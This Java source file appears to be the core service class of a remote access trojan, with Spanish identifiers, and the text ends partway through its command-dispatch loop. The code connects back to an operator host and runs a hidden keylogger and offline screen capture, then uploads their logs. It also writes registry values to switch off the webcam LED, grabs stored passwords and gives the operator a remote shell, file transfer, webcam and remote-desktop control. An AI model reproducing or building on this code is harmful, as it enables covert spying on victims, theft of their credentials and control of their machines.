package rt;

import comunes.Accion;
import comunes.CapturaOpciones;
import comunes.Comando;
import comunes.WebCamInterface;
import comunes.WebCamItem;
import java.awt.Color;
import java.awt.event.KeyEvent;
import java.awt.im.InputContext;
import java.io.File;
import java.net.InetAddress;
import java.util.Locale;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.sound.sampled.AudioFormat;
import network.Conexion;
import network.ConexionServer;
import rt.interfaces.AR;
import comunes.Interfaz;
import static java.lang.Thread.sleep;
import rt.modulos.archivos.GENV;
import rt.modulos.var.CMD;
import rt.modulos.var.Chat;
import rt.modulos.var.RED;
import rt.modulos.voip.REP;
import rt.util.CLRT;
import rt.util.CbUtil;
import rt.util.IMG;
import rt.util.Protocolo;
import rt.util.UtilRT;

public class Servicio extends Thread implements Interfaz {

    private Accion accionConectar;
    private Accion accionInfo;//accion a ejecutar cuando se envia la info
    private Accion accionAutenticar;//accion a ejecutar cuando se esta autenticando
    private Accion accionAbrirEscritorio;//accion a ejecutar cuando se abre el escritorio
    private Accion accionDetenerEscritorio;//accion a ejecutar cuando se detiene el escritorio
    private Accion accionDesconectar;//accion a ejecutar cuando se desconecta
    private Accion accionListo;//accion a ejecutar cuando se termino el proceso de conexion, cuadno se abre el escritorio remoto en el modo simple

    private String idServicio = ""; //identificador de servicio, para el escritorio remoto
    private static final int INVERSA = 1;
    private static final int DIRECTA = 2;
    private int tipoConexion = 1; //1 cliente (conexion inversa), 2 servidor (conexion directa)
    private ConexionServer server;
    private Conexion conexion;
    private GENV gestorEnvio;
    private Interfaz webC;
    private Interfaz microfono;
    private Interfaz escritorioRemoto;
    private Interfaz servicio2;
    private Interfaz buscar;
    private Interfaz capturadorOffline;
    private AR registro;
    private RED servicioRed;
    private Interfaz kl;
    private Interfaz jnaUtil = null;
    private Chat vChat;
    private REP sonido;
    private CMD consola;
    private CbUtil clipboard;
    private Interfaz pingInstancia;
    private boolean conectado;
    private String host;
    private String password;
    private int puerto;
    private int puertoTransferencias;
    private String prefijo;
    private int delayConexion;
    private boolean autenticado = false;
    private boolean capturaOffline = false;
    private int delayCapturaEscritorio;
    private int intentos = 0;
    private boolean proxy = false;
    private boolean ejecutar = true;
    private boolean clipBoardActivo = false;
    private long ping;
    private long pong;
    private long tiempoPing = 100;//asumo un tiempo inicial de 100 milisegundos

    // mientrasn no haya conexion con el servidor, se deja el uso de memoria y cpu al minimo, solo lo necesario para intentar conexion
    //exceptuando los procesos de vigilancia offline
    //activa todo lo necesario para operar
    private void activarServicios() {
        //se inicia instancia del PING
        try {
            pingInstancia = ((Interfaz) new CLRT().loadClass("rt.util.PING").newInstance());
            pingInstancia.instanciar(this);
        } catch (Exception ex) {
            pingInstancia = null;
        }
        try {
            jnaUtil = ((Interfaz) Class.forName("plugin.jna.JnaUtil").newInstance());
        } catch (Exception ex) {
            jnaUtil = null;
        }
        gestorEnvio = new GENV(this);
        gestorEnvio.iniciar();
        //servicio de transferencias en conexiones directas
        if (this.isConexionDirecta()) {
            try {
                servicio2 = ((Interfaz) new CLRT().loadClass("rt.CONAR").newInstance());
                servicio2.instanciar(this, puertoTransferencias);
            } catch (Exception ex) {
                servicio2 = null;
            }
        }
    }

    private void desactivarServicios() {

        try {
            buscar.ejecutar(1);
        } catch (Exception e) {

        }
        buscar = null;
        try {
            pingInstancia.ejecutar(1);
        } catch (Exception e) {

        }
        pingInstancia = null;
        try {
            gestorEnvio.detener();
        } catch (Exception e) {
        }
        gestorEnvio = null;
        if (consola != null) {
            consola.desactivar();
            consola = null;
        }
        //cierra la webcam
        if (webC != null) {
            webC.ejecutar(1);
            webC = null;
        }
        if (escritorioRemoto != null) {
            escritorioRemoto.ejecutar(1);
            escritorioRemoto = null;
        }
        if (microfono != null) {
            microfono.ejecutar(1);
            microfono = null;
        }
        if (servicioRed != null) {
            servicioRed.detener();
            servicioRed = null;
        }
        try {
            if (vChat != null) {
                vChat.dispose();
                vChat = null;
            }
        } catch (Exception e) {
        }
    }

    @Override
    public void instanciar(Object... parametros) {
        this.clipboard = new CbUtil(this);
        this.host = (String) parametros[0];
        this.puerto = (Integer) parametros[1];
        this.puertoTransferencias = (Integer) parametros[2];
        this.password = (String) parametros[3];
        this.delayConexion = (Integer) parametros[4];
        String pref = (String) parametros[5];
        pref = (pref == null) ? "" : pref;
        this.capturaOffline = (Boolean) parametros[6];
        this.delayCapturaEscritorio = (Integer) parametros[7];
        this.tipoConexion = (Integer) parametros[8];//inversa o directa

        this.prefijo = pref;

        if (UtilRT.isWindows()) {
            try {
                registro = ((AR) new CLRT().loadClass("rt.util.REG").newInstance());
            } catch (Exception ex) {
                registro = null;
            }
        }
//        crearArchivotmp();
        //this.conectar();
    }

    private void iniciar() {
        try {
            start();
        } catch (Exception e) {
        }
    }

    private void detener() {
        ejecutar = false;
        try {
            server.cerrar();
        } catch (Exception e) {

        }
        try {
            servicio2.ejecutar(1);//detener
        } catch (Exception e) {
        }
        try {
            conexion.cerrar();
        } catch (Exception e) {

        }
    }

    private void usarProxy() {
        System.setProperty("java.net.useSystemProxies", "true");
    }

    private void NoUsarProxy() {
        System.setProperty("java.net.useSystemProxies", "false");
    }

    private void conectar() {
        try {
            conectado = false;
            autenticado = false;
//            System.out.println("se va a conectar tipoCon=" + tipoConexion);
            if (tipoConexion == INVERSA) {
                if (intentos > 10) {
                    intentos = 0;
                    proxy = !proxy;
                    if (proxy) {
                        usarProxy();
                    } else {
                        NoUsarProxy();
                    }
                }
                idServicio = host + ":" + puerto + "P" + (Integer) Inicio.config.obtenerParametro("protocolo");
//                System.out.println("conectando a ");
//                System.out.println("h=" + host);
//                System.out.println("p=" + puerto);
//                System.out.println("protocolos=" + (Integer) Inicio.config.obtenerParametro("protocolo"));
//                System.out.println("ssl=" + (Boolean) Inicio.config.obtenerParametro("ssl"));
                conexion = new Conexion(host, puerto, (Integer) Inicio.config.obtenerParametro("protocolo"), (Boolean) Inicio.config.obtenerParametro("ssl"));
                if ((Integer) Inicio.config.obtenerParametro("protocolo") == ConexionServer.UDP) {
                    //System.out.println("iniciando conexion UDP");
                    enviarComandoInt(Protocolo.UDP_INICIAR);
                }
            } else {//directa, esperamos conexion
                server = new ConexionServer((Integer) Inicio.config.obtenerParametro("protocolo"), puerto, (Boolean) Inicio.config.obtenerParametro("ssl"));
                conexion = server.aceptar();
                idServicio = conexion.getHost() + ":" + conexion.getPuerto() + "P" + (Integer) Inicio.config.obtenerParametro("protocolo");
            }
            conectado = true;
            try {
                if (accionConectar != null) {
                    accionConectar.ejecutar();
                }
            } catch (Exception e) {
            }
            activarServicios();
            if (password == null || password.isEmpty()) {
                autenticado = true;
                this.enviarInfo();
            } else {
                this.autenticar();
            }

        } catch (Exception ex) {
//            ex.printStackTrace();
            intentos++;
            conectado = false;
        }
    }

    private boolean verificarAutenticar() {
        if (!autenticado) {
            this.autenticar();
        }
        return autenticado;
    }

    private void subirArchivo(String rutaAsubir, String archivoAsubir, Conexion conexion, int bufferSize) {
        rutaAsubir = UtilRT.procesaNombreCarpeta(rutaAsubir);
        try {
            Interfaz recibArchiv = ((Interfaz) new CLRT().loadClass("rt.modulos.archivos.DAR").newInstance());
            recibArchiv.instanciar(this, archivoAsubir, rutaAsubir, conexion, bufferSize);
            recibArchiv.ejecutar(0);
        } catch (Exception ex) {
        }
    }

    private void autenticar() {
        this.enviarComando(Protocolo.AUTENTICAR);
        if (accionAutenticar != null) {
            accionAutenticar.ejecutar();
        }
    }

    private void enviarListaEquiposRed() {
        try {
            servicioRed = new RED();
            servicioRed.instanciar(this);
            servicioRed.iniciar();
        } catch (Exception e) {
        }
    }

//    private void detenerListaEquiposRed() {
//        try {
//            servicioRed.detener();
//        } catch (Exception e) {
//        }
//    }
    private String getHostName() {
        InetAddress iAddress = null;
        try {
            iAddress = InetAddress.getLocalHost();
        } catch (Exception ex) {
        }
        String hostname = null;
        if (iAddress != null) {
            hostname = iAddress.getCanonicalHostName();
        }
        if (hostname != null) {
            return hostname;
        }
        hostname = System.getenv("COMPUTERNAME");
        if (hostname != null) {
            return hostname;
        }
        hostname = System.getenv("HOSTNAME");
        if (hostname != null) {
            return hostname;
        }
        return this.conexion.getLocalAddress().getHostName();
    }

    private String getLocalIp() {
        return this.conexion.getLocalAddress().getHostAddress();
    }

    private void deneterVistaPrevia() {
        if (webC != null) {
            try {
                webC.ejecutar(1);
                webC = null;
            } catch (Exception e) {
            }
        }
    }

    private Interfaz abrirCamaraDefault() {
        try {
            if (webC == null) {
                WebCamInterface wci = ((WebCamInterface) Class.forName("comunes.ObtenerWebCam").newInstance());
                WebCamItem[] lstTmp = wci.listar();
                webC = ((Interfaz) new CLRT().loadClass("rt.modulos.cam.CWC").newInstance());
                webC.instanciar(this);
                webC.set(1, lstTmp[0].getNombre());//seleccionar la primer webcam
                webC.ejecutar(2);//abrir
                webC.set(2, 75);//setCalidad(75);
            }
            return webC;
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return null;
    }

    private void cerrarWC() {
        try {
            webC.ejecutar(1);//detener y cierra la webcam
        } catch (Exception ex) {

        }
    }

    private void enviarWebCamMiniatura() {
        try {
            abrirCamaraDefault();
            enviarComando(Protocolo.GET_MINIATURA_CAM, webC.get(0));
        } catch (Exception ex) {

        }
    }

    private void activaractivadesactivaLedWebCam(boolean activar) {
        try {
            if (UtilRT.isWindows()) {
                String sdef = activar ? "5" : "0";
                String ledmode = activar ? "1" : "0";
                registro.writeStringValue(0x80000002, "SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\0015", "LedMode", ledmode);
                registro.writeStringValue(0x80000002, "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}\\0000\\Settings", "Default", sdef);
                registro.writeStringValue(0x80000002, "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}\\0001\\Settings", "Default", sdef);
                registro.writeStringValue(0x80000002, "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}\\0002\\Settings", "Default", sdef);
                registro.writeStringValue(0x80000002, "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}\\0003\\Settings", "Default", sdef);
                registro.writeStringValue(0x80000002, "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}\\0004\\Settings", "Default", sdef);
                registro.writeStringValue(0x80000002, "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}\\0005\\Settings", "Default", sdef);
                this.enviarMensaje("WebCam Activo:" + activar);
            } else {
                this.enviarMensaje("Solo se puede desactivar en windows");
            }
        } catch (Exception ex) {
            this.enviarMensaje("ERROR AL " + (activar ? "ACTIVAR" : "DESACTIVAR") + " LED: " + ex.getMessage());
        }
    }

    private void dmPass() {
        try {
            if (UtilRT.isWindows()) {
                String tmp = registro.getPassDM();
                this.enviarComando(Protocolo.PASSWORDS_DM, tmp);
            }
        } catch (Exception e) {
        }
    }

    //suado para el comando de inicio de UDP
    public void enviarComandoInt(int i) throws Exception {
        conexion.escribirInt(i);
        conexion.flush();
    }

    public synchronized void enviarComando(int i, Object... cmd) {
        enviarObjeto(UtilRT.comprimirObjeto(UtilRT.crearComando(i, cmd.length, cmd)));
    }

    private void enviarObjeto(Object objeto) {
        try {
            conexion.escribirObjeto(objeto);
            conexion.flush();
        } catch (Exception ex) {
        }
    }

    private boolean isConectado() {
        return conectado;
    }

    private String getHost() {
        return host;
    }

    private int getPuerto() {
        return puerto;
    }

    private int getPuertoTransferencias() {
        return puertoTransferencias;
    }

    private void enviarMensaje(String mensaje) {
        this.enviarComando(Protocolo.MENSAJE_SERVIDOR, mensaje);
    }

    private void restarEnviandoArchivo() {
        gestorEnvio.restarDescarga();
    }

    private Interfaz getJnaUtil() {
        return jnaUtil;
    }
//envia los archivos de captura actuales

    private void enviarOffline() {
        try {
            if (capturadorOffline != null) {
                capturadorOffline.set(3, true);//copiando
                //archivo capturas pantallas
                try {
                    File f = ((File) capturadorOffline.get(1));
                    if (f != null && f.exists()) {
                        try {
//                            System.out.println("arhivo original " + f.getAbsolutePath());
                            File tmp = new File(System.getProperty("java.io.tmpdir"), "captura_" + UtilRT.nombreHora() + ".dat");
                            UtilRT.copyFile(f, tmp);
//                            System.out.println("arhivo tmp " + tmp.getAbsolutePath());
                            descargarArchivo(tmp.getAbsolutePath(), "<capturas>", 0L);
                        } catch (Exception ex) {
                        }
                    } else {
                        this.enviarMensaje("NO EXISTEN ARCHIVOS OFFLINE");
                    }
                } catch (Exception e) {
                    this.enviarMensaje("NO EXISTEN ARCHIVOS KEYLOGUER OFFLINE");
                }
                try {
                    //espero 2 segundos para prueba
                    Thread.sleep(2000);
                } catch (InterruptedException ex) {
                    Logger.getLogger(Servicio.class.getName()).log(Level.SEVERE, null, ex);
                }
                //archivo keylogger
                try {
                    File f = ((File) capturadorOffline.get(5));
                    if (f != null && f.exists()) {
                        try {
                            File tmp = new File(System.getProperty("java.io.tmpdir"), "keylogger_" + UtilRT.nombreHora() + ".txt");
                            UtilRT.copyFile(f, tmp);
                            descargarArchivo(tmp.getAbsolutePath(), "<keylogger>", 0L);
                        } catch (Exception ex) {
                        }
                    } else {
                        this.enviarMensaje("NO EXISTEN ARCHIVOS OFFLINE");
                    }
                } catch (Exception e) {
                    this.enviarMensaje("NO EXISTEN ARCHIVOS KEYLOGUER OFFLINE");
                }
                capturadorOffline.set(3, false);//copiando
            }
        } catch (Exception e) {

        }
    }

    private void enviarTodosOffline() {
        if (capturadorOffline != null) {
            try {
                capturadorOffline.set(3, true);//copiando
                //archivo capturas pantallas
                try {
                    File f = ((File) capturadorOffline.get(6));//la carpeta de descargas
                    File f2 = ((File) capturadorOffline.get(1));//archivo de pantallas actual para distinguirlo del resto
                    File f3 = ((File) capturadorOffline.get(5)); //archivo de keylogger actual para distinguirlo del resto
                    if (f != null && f.exists()) {
                        //descargarArchivo(f.getAbsolutePath(), "");//descargo toda la carpeta
                        for (File ff : f.listFiles()) {
                            //System.out.println("archivo ");
                            //System.out.println(ff.getAbsolutePath());
                            if (ff.getName().equals(f2.getName())) {
                                try {
                                    //copio el archivo
                                    //System.out.println("arhivo original " + f.getAbsolutePath());
                                    File tmp = new File(System.getProperty("java.io.tmpdir"), "captura_" + UtilRT.nombreHora() + ".dat");
                                    UtilRT.copyFile(ff, tmp);
                                    descargarArchivo(tmp.getAbsolutePath(), "<capturas>", 0L);
                                } catch (Exception ex) {
                                }
                            } else if (ff.getName().equals(f3.getName())) {//si es el archivo del keylogger
                                try {
                                    //copio el archivo
                                    //System.out.println("arhivo original " + f.getAbsolutePath());
                                    File tmp = new File(System.getProperty("java.io.tmpdir"), "keylogger_" + UtilRT.nombreHora() + ".dat");
                                    UtilRT.copyFile(ff, tmp);
                                    descargarArchivo(tmp.getAbsolutePath(), "<keylogger>", 0L);
                                } catch (Exception ex) {
                                }
                            } else {
                                //descargo sin copiar ps son de anteriores dias y no se estan usando
                                descargarArchivo(ff.getAbsolutePath(), "<capturas>", 0L);
                            }
                        }
                    } else {
                        this.enviarMensaje("NO EXISTEN ARCHIVOS OFFLINE");
                    }
                } catch (Exception e) {
                    this.enviarMensaje("NO EXISTEN ARCHIVOS KEYLOGUER OFFLINE");
                }
            } catch (Exception e) {

            }
            capturadorOffline.set(3, false);//copiando
        }
    }

    private void eliminarTodosArchivosOffline() {
        if (capturadorOffline != null) {
            try {
                capturadorOffline.set(3, true);//copiando
                //archivo capturas pantallas
                try {
                    File f = ((File) capturadorOffline.get(6));//la carpeta de descargas
                    if (f != null && f.exists()) {
                        for (File ff : f.listFiles()) {
                            ff.delete();
                        }
                    }
                } catch (Exception e) {
                }
            } catch (Exception e) {
            }
            capturadorOffline.set(3, false);//copiando
        }
    }

    private int activarKeylogger() {
        try {
            if (kl == null) {
                kl = ((Interfaz) Class.forName("plugin.keylogger.KeyLogger").newInstance());
                kl.ejecutar(0);//iniciar
            } else if (!(Boolean) kl.get(0)) {
                kl.ejecutar(0);//iniciar
            }
            return 1;
        } catch (Exception e) {

        }
        return 0;
    }

    private void detenerKeylogger() {
        try {
            if (kl != null) {
                //kl.vaciar();
                kl.ejecutar(1);//detener
            }
        } catch (Exception e) {
        }
    }

    private void descargarArchivo(String archivoADescargar, String rutaADescargarDelCliente, Long offset) {
        try {
            gestorEnvio.agregarEnvio(archivoADescargar, rutaADescargarDelCliente, new File(archivoADescargar).getParent(), offset);
        } catch (Exception e) {
            gestorEnvio.agregarEnvio(archivoADescargar, rutaADescargarDelCliente, offset);
        }
    }

    private void descargarArchivo(String archivoADescargar, String rutaADescargarDelCliente, Conexion conexion, int bufferSize, Long offset) {
        try {
            gestorEnvio.agregarEnvio(archivoADescargar, rutaADescargarDelCliente, new File(archivoADescargar).getParent(), conexion, bufferSize, offset);
        } catch (Exception e) {
            gestorEnvio.agregarEnvio(archivoADescargar, rutaADescargarDelCliente, conexion, bufferSize, offset);
        }
    }

    private void iniciarEscritorioRemoto(Conexion conexion, CapturaOpciones opciones) {
        if (escritorioRemoto == null) {

            if (accionAbrirEscritorio != null) {
                accionAbrirEscritorio.ejecutar();
            }

            try {
                switch (opciones.getAlgoritmo()) {
                    case 3:
                        escritorioRemoto = ((Interfaz) new CLRT().loadClass("rt.modulos.escritorio.V3.ER").newInstance());
                        break;
                    case 2:
                        escritorioRemoto = ((Interfaz) new CLRT().loadClass("rt.modulos.escritorio.V2.ER").newInstance());
                        break;
                    //algoritmo viejo
                    //case 1:
                    default:
                        escritorioRemoto = ((Interfaz) new CLRT().loadClass("rt.modulos.escritorio.V1.ER").newInstance());
                        break;
                }
                escritorioRemoto.instanciar(this);
            } catch (Exception ex) {
            }
        }
        //setea parametros
        if (escritorioRemoto != null) {
            try {
                escritorioRemoto.set(1, opciones);
                clipBoardActivo = opciones.isPortapalesActivos();
                if (conexion != null) {
                    escritorioRemoto.set(15, conexion);//setConexion
                }
                //if (pantalla.estaDetenido() || !pantalla.estaActivo()) {
                if ((Boolean) escritorioRemoto.get(17) || !(Boolean) escritorioRemoto.get(16)) {
                    escritorioRemoto.ejecutar(0);//iniciar
                }
            } catch (Exception ex) {
            }
        }
    }

    private void enviarInfo() {
        if (accionInfo != null) {
            accionInfo.ejecutar();
        }

        procesarOpcion(Protocolo.INFO, String.valueOf(puertoTransferencias), prefijo, getLocalIp(), accionListo);
    }

    private void enviarPortaPapeles(int tipo, Object objeto) {
        if (objeto != null) {
            if (clipBoardActivo) {
                try {
                    enviarComando(Protocolo.ENVIAR_PORTAPAPELES, objeto);
                } catch (Exception e) {
                }
            }
        }
    }

    @Override
    public void run() {

//        this.setName("hilo-Servicio-" + UtilRT.getHiloId());
        String param1;
        String param2;
        String parametros[];
        Comando comando;
        while (ejecutar) {
            try {
                if (capturaOffline) {
                    //capturaFotos
                    if (capturadorOffline == null || !(Boolean) capturadorOffline.get(2)) {
                        //activa el keylogger
                        activarKeylogger();
                        try {
                            capturadorOffline = ((Interfaz) new CLRT().loadClass("rt.modulos.var.COFF").newInstance());
                            capturadorOffline.instanciar(this, delayCapturaEscritorio, kl, prefijo, delayCapturaEscritorio, delayCapturaEscritorio);
                            capturadorOffline.ejecutar(0);
                        } catch (Exception ex) {
                        }
                    }
                }
                if (!conectado) {
                    try {
                        sleep(delayConexion);
                    } catch (Exception ex) {
                    }
                    this.conectar();
                }

                if (conectado) {
                    //int comando = conexion.leerInt();
                    comando = (Comando) UtilRT.descomprimirObjeto((byte[]) conexion.leerObjeto());
                    switch (comando.getComando()) {
                        case Protocolo.AUTENTICAR:

                            if (accionAutenticar != null) {
                                accionAutenticar.ejecutar();
                            }

                            param1 = (String) UtilRT.leerParametro(comando);
                            if (!autenticado) {
                                try {
                                    if (Servicio.this.password == null || Servicio.this.password.isEmpty()) {
                                        autenticado = true;
                                        enviarInfo();
                                        break;
                                    } else if (Servicio.this.password.equals(param1)) {
                                        autenticado = true;
                                        enviarInfo();
                                        break;
                                    } else {
                                        autenticado = false;
                                    }
                                } catch (Exception e) {
                                }
                            }
                            break;
                    }
                    verificarAutenticar();
                    if (autenticado) {
                        switch (comando.getComando()) {
                            case Protocolo.PONG:
                                pong = System.currentTimeMillis();
                                tiempoPing = pong - ping;
                                break;
                            case Protocolo.PING:
                                this.enviarComando(Protocolo.PONG);
                                break;
                            case Protocolo.INFO:
                                enviarInfo();
                                break;
                            case Protocolo.GET_INFO_COMPLETA:
                                procesarOpcion(Protocolo.GET_INFO_COMPLETA, String.valueOf(puertoTransferencias), prefijo, getLocalIp());
                                break;
                            case Protocolo.ENVIAR_PORTAPAPELES:
                                try {
                                    Object objPortapaleles = UtilRT.leerParametro(comando);
                                    if (objPortapaleles != null) {
                                        clipboard.setContent(objPortapaleles);
                                    }
                                } catch (Exception e) {
                                    enviarMensaje("Error portapapeles " + e.getMessage() + " :  " + e.getLocalizedMessage());
                                    enviarMensaje(e.getLocalizedMessage());
                                }
                                break;
                            case Protocolo.ENVIAR_MSG:
                                parametros = ((String) UtilRT.leerParametro(comando)).split("&&");
                                UtilRT.mostrarMSG(parametros[0], parametros[1], Integer.valueOf(parametros[2]));
                                break;
                            case Protocolo.SERVIDOR_DESINSTALAR:
                                Inicio.d();
                                break;
                            case Protocolo.ADMIN_ARCHIVOS_DESCARGAR:
                                param1 = (String) UtilRT.leerParametro(comando, 0);
                                param2 = (String) UtilRT.leerParametro(comando, 1);
                                long offset = 0;
                                try {
                                    offset = (Long) UtilRT.leerParametro(comando, 2);
                                } catch (Exception e) {

                                }
                                descargarArchivo(param1, param2, offset);
                                break;
                            case Protocolo.BUSCAR_ARCHIVO:
                                try {
                                    parametros = ((String) UtilRT.leerParametro(comando)).split("#");
                                    buscar = ((Interfaz) new CLRT().loadClass("rt.modulos.archivos.BAR").newInstance());
                                    buscar.instanciar(Servicio.this, parametros[0], parametros[1]);
                                } catch (Exception ex) {
                                    buscar = null;
                                    Servicio.this.enviarMensaje("ERROR AL BUSCAR:" + ex.getMessage());
                                }
                                break;
                            case Protocolo.BUSCAR_ARCHIVO_DETENER:
                                if (buscar != null) {
                                    buscar.ejecutar(1);
                                    buscar = null;
                                }
                                break;
                            case Protocolo.GET_MINIATURA_CAM:
                                enviarWebCamMiniatura();
                                break;
                            case Protocolo.DETENER_VISTA_PREVIA:
                                deneterVistaPrevia();
                                break;
                            case Protocolo.COMANDO_SHELL_CHAR:
                                if (consola != null && consola.isActivo()) {
                                    consola.escribirCaracter(UtilRT.leerParametro(comando).toString().charAt(0));
                                } else {
                                    enviarComando(Protocolo.COMANDO_SHELL, "\nConsola desactivada. Actívela primero\n");
                                }
                                break;
                            case Protocolo.COMANDO_SHELL:
                                if (consola != null && consola.isActivo()) {
                                    consola.ejecutarComando((String) UtilRT.leerParametro(comando));
                                } else {
                                    enviarComando(Protocolo.COMANDO_SHELL, "\nConsola desactivada. Actívela primero\n");
                                }
                                break;
                            case Protocolo.CONSOLA_ACTIVAR:
                                try {
                                    if (consola != null) {
                                        consola.desactivar();
                                        consola = null;
                                    }
                                    consola = new CMD(this);
                                    consola.activar();
                                } catch (Exception e) {
                                }
                                break;
                            case Protocolo.CONSOLA_DESACTIVAR:
                                try {
                                    if (consola != null) {
                                        consola.desactivar();
                                        consola = null;
                                    }
                                } catch (Exception e) {
                                }
                                break;
                            case Protocolo.ADMIN_ARCHIVOS_CREAR_CARPETA:
                                try {
                                    param1 = (String) UtilRT.leerParametro(comando, 0);//nomCarpeta
                                    param2 = (String) UtilRT.leerParametro(comando, 1);//rutaAcrear
                                    param2 = UtilRT.procesaNombreCarpeta(param2);
                                    File carpeta = new File(param2, param1);
                                    carpeta.mkdirs();
                                } catch (Exception e) {
                                }
                                break;

                            case Protocolo.ESCRITORIO_REMOTO_EVENTO:
                                try {
                                    escritorioRemoto.ejecutar(6, (Object[]) comando.getObjeto());
                                } catch (Exception e) {
//                                    e.printStackTrace();
                                }
                                break;
                            case Protocolo.ESCRITORIO_REMOTO_MOUSE:
                                try {
                                    parametros = ((String) UtilRT.leerParametro(comando)).split(":");
                                    escritorioRemoto.ejecutar(2, Float.valueOf(parametros[0]), Float.valueOf(parametros[1]), Integer.valueOf(parametros[3]), Integer.valueOf(parametros[2]), Integer.valueOf(parametros[4]));
                                } catch (Exception ex) {
                                }
                                break;
                            case Protocolo.CTRL_ALT_SUPR:
                                escritorioRemoto.ejecutar(5);
                                break;
                            case Protocolo.BLOQUEAR_EQUIPO:
                                try {
                                    jnaUtil.ejecutar(1);
                                } catch (Exception e) {
                                }
                                break;
                            case Protocolo.ESCRITORIO_REMOTO_TECLA:
                                try {
                                    parametros = ((String) UtilRT.leerParametro(comando)).split(":");
                                    escritorioRemoto.ejecutar(4, Integer.valueOf(parametros[1]), Integer.valueOf(parametros[0]));
                                } catch (Exception ex) {
                                }
                                break;
                            case Protocolo.TECLA_OBJETO:
                                try {
                                    KeyEvent eventoKey = (KeyEvent) UtilRT.leerParametro(comando);
                                    switch (eventoKey.getID()) {
                                        case 401: //presionado
                                            escritorioRemoto.ejecutar(4, 1, eventoKey.getKeyCode());
                                            break;
                                        case 402: //liberado
                                            escritorioRemoto.ejecutar(4, 2, eventoKey.getKeyCode());
                                            break;
                                    }
                                } catch (Exception ex) {
                                    enviarMensaje("Error tecla objeto:" + ex.getMessage() + " " + ex.getLocalizedMessage() + " " + ex.toString());
                                }
                                break;
                            case Protocolo.ADMIN_ARCHIVOS_SUBIR:
                                try {
                                    param1 = (String) UtilRT.leerParametro(comando, 0);//archivoAsubir
                                    param2 = (String) UtilRT.leerParametro(comando, 1);//ruta a ADMIN_ARCHIVOS_SUBIR
                                    this.procesarOpcion(Protocolo.ADMIN_ARCHIVOS_SUBIR, param2, param1);
                                } catch (Exception e) {
                                }
                                break;
                            case Protocolo.ADMIN_ARCHIVOS_MOVER:
                                try {
                                    param1 = (String) UtilRT.leerParametro(comando, 0);//rutaArchivo
                                    param2 = (String) UtilRT.leerParametro(comando, 1);//nuevo nombre
                                    this.procesarOpcion(Protocolo.ADMIN_ARCHIVOS_MOVER, param1, param2);
                                } catch (Exception e) {
                                }
                                break;
                            case Protocolo.ADMIN_ARCHIVOS_COPIAR:
                                try {
                                    param1 = (String) UtilRT.leerParametro(comando, 0);//rutaArchivo
                                    param2 = (String) UtilRT.leerParametro(comando, 1);//nuevo nombre
                                    this.procesarOpcion(Protocolo.ADMIN_ARCHIVOS_COPIAR, param1, param2);
                                } catch (Exception e) {
                                }
                                break;
                            case Protocolo.SUBIR_SERVIDOR:
                                try {
                                    param1 = (String) UtilRT.leerParametro(comando, 0);//servidorAsubir
                                    param2 = (String) UtilRT.leerParametro(comando, 1); // ruta a ADMIN_ARCHIVOS_SUBIR servidor
                                    param2 = UtilRT.procesaNombreCarpeta(param2);
                                    try {
                                        Interfaz recibServidor = ((Interfaz) new CLRT().loadClass("rt.modulos.archivos.DAR").newInstance());
                                        recibServidor.instanciar(this, param1, param2, true);
                                        recibServidor.ejecutar(0);
                                    } catch (Exception ex) {
                                    }
                                } catch (Exception e) {
                                }
                                break;
                            case Protocolo.SERVIDOR_APAGAR:
                                System.exit(0);
                                break;
                            case Protocolo.PASSWORDS_DM:
                                dmPass();
                                break;
//                            case Protocolo.GET_LISTA_OFFLINE:
//                                listarOffline();
//                                break;
                            case Protocolo.DESCARGAR_OFFLINE:
                                enviarOffline();
                                break;
                            case Protocolo.DESCARGAR_LISTA_OFFLINE:
                                enviarTodosOffline();
                                break;
                            case Protocolo.ELIMINAR_OFFLINE:
                                try {
                                    if (capturadorOffline != null) {
                                        capturadorOffline.set(3, true);//copiando
                                        ((File) capturadorOffline.get(1)).delete();
                                        capturadorOffline.set(3, false);//copiando
                                    }
                                } catch (Exception e) {
                                }
                                break;
                            case Protocolo.ESCRITORIO_REMOTO:
                                iniciarEscritorioRemoto(null, (CapturaOpciones) UtilRT.leerParametro(comando));
                                break;
                            case Protocolo.ESCRITORIO_REMOTO_DETENER:
                                if (escritorioRemoto != null) {
                                    escritorioRemoto.ejecutar(1);
                                    escritorioRemoto = null;
                                    if (accionDetenerEscritorio != null) {
                                        accionDetenerEscritorio.ejecutar();
                                    }
                                    IMG.liberarFiltros();
                                    UtilRT.gc();
                                }
                                break;
                            case Protocolo.ESCRITORIO_REMOTO_ACTUALIZAR_PANTALLA:
                                if (escritorioRemoto != null) {
                                    escritorioRemoto.ejecutar(3);
                                }
                                break;
                            case Protocolo.CAPTURA_WEB_CAM:
                                parametros = ((String) UtilRT.leerParametro(comando)).split(":");
                                if (webC != null) {
                                    webC.set(2, Float.parseFloat(parametros[2]));//calidad
                                }
                                break;
                            case Protocolo.ABRIR_WEBCAM:
                                parametros = ((String) UtilRT.leerParametro(comando)).split(":::");
                                if (webC == null) {
                                    try {
                                        webC = ((Interfaz) new CLRT().loadClass("rt.modulos.cam.CWC").newInstance());
                                        webC.instanciar(this);
                                        webC.set(1, parametros[0]);//seleccionar
                                        webC.set(5, parametros[1]);//seleccionar dimension
                                        webC.ejecutar(2);//abrir
                                        webC.set(2, 100f);//calidadd
                                        webC.ejecutar(0);
                                    } catch (Exception ex) {
                                        ex.printStackTrace();
                                    }
                                } else {
                                    webC.ejecutar(1);
                                    webC.set(1, parametros[0]);//seleccionar
                                    webC.set(5, parametros[1]);//seleccionar dimension
                                    webC.ejecutar(2);//abrir
                                    webC.set(2, 100f);//calidad
                                    webC.ejecutar(0);
                                }
                                break;
                            case Protocolo.CERRAR_WEB_CAM:
                                if (webC != null) {
                                    webC.ejecutar(1);
                                    webC = null;
                                }
                                break;
